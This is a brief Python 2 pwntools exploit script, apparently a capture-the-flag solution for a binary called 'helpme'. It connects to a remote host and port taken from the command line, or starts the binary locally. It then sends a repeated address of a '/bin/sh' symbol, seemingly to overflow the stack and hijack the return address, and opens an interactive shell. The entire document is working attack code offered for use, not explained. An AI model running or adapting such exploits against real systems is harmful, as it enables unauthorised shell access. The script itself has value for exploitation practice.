#!/usr/bin/python2

from pwn import *
import sys
import string
import time

#context.log_level = 'DEBUG'
#context.terminal = ['/usr/bin/termite', '-e']

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./helpme')
    #gdb.attach(p)
e = ELF('./helpme')

p.sendline(p64(e.sym.binsh) * 10)
p.interactive()
